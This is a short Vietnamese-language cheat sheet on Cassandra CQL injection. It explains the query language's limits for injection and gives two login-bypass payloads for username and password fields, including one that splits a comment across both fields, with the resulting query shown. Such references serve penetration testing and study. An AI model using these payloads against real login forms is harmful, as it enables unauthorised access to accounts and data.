# Cassandra Injection
> Apache Cassandra là một hệ quản trị cơ sở dữ liệu NoSQL dạng cột phân tán, miễn phí và mã nguồn mở.

## Tóm tắt
* [Các hạn chế của CQL Injection](#cql-injection-limitations)
* [Chú thích trong Cassandra](#cassandra-comment)
* [Vượt qua đăng nhập Cassandra](#cassandra-login-bypass)
    * [Ví dụ #1](#example-1)
    * [Ví dụ #2](#example-2)
* [Tài liệu tham khảo](#references)

## Các hạn chế của CQL Injection
* Cassandra là cơ sở dữ liệu phi quan hệ, do đó CQL không hỗ trợ các câu lệnh `JOIN` hay `UNION`, khiến việc truy vấn xuyên bảng trở nên khó khăn hơn.
* Ngoài ra, Cassandra không có các hàm tiện lợi có sẵn như `DATABASE()` hay `USER()` để lấy thông tin metadata của cơ sở dữ liệu.
* Một hạn chế khác là sự thiếu vắng toán tử `OR` trong CQL, khiến việc tạo ra các điều kiện luôn đúng trở nên bất khả thi; ví dụ, một câu truy vấn như `SELECT * FROM table WHERE col1='a' OR col2='b';` sẽ bị từ chối.
* Các kỹ thuật SQL injection dựa trên thời gian, vốn thường dựa vào các hàm như `SLEEP()` để tạo độ trễ, cũng khó thực hiện trong CQL vì nó không có hàm `SLEEP()`.
* CQL không cho phép truy vấn con hay các câu lệnh lồng nhau khác, vì vậy một câu truy vấn như `SELECT * FROM table WHERE column=(SELECT column FROM table LIMIT 1);` sẽ bị từ chối.

## Chú thích trong Cassandra
```sql
/* Cassandra Comment */
```

## Vượt qua đăng nhập Cassandra
### Ví dụ #1
```sql
username: admin' ALLOW FILTERING; %00
password: ANY
```
### Ví dụ #2
```sql
username: admin'/*
password: */and pass>'
```
Đoạn injection sẽ trông giống như câu truy vấn SQL sau
```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```

## Tài liệu tham khảo
* [Cassandra injection vulnerability triggered - DATADOG - January 30, 2023](https://web.archive.org/web/20230130053010/https://docs.datadoghq.com/fr/security/default_rules/appsec-cass-injection-vulnerability-trigger/)
* [Investigating CQL injection in Apache Cassandra - Mehmet Leblebici - December 2, 2022](https://web.archive.org/web/20251213065510/https://www.invicti.com/blog/web-security/investigating-cql-injection-apache-cassandra)
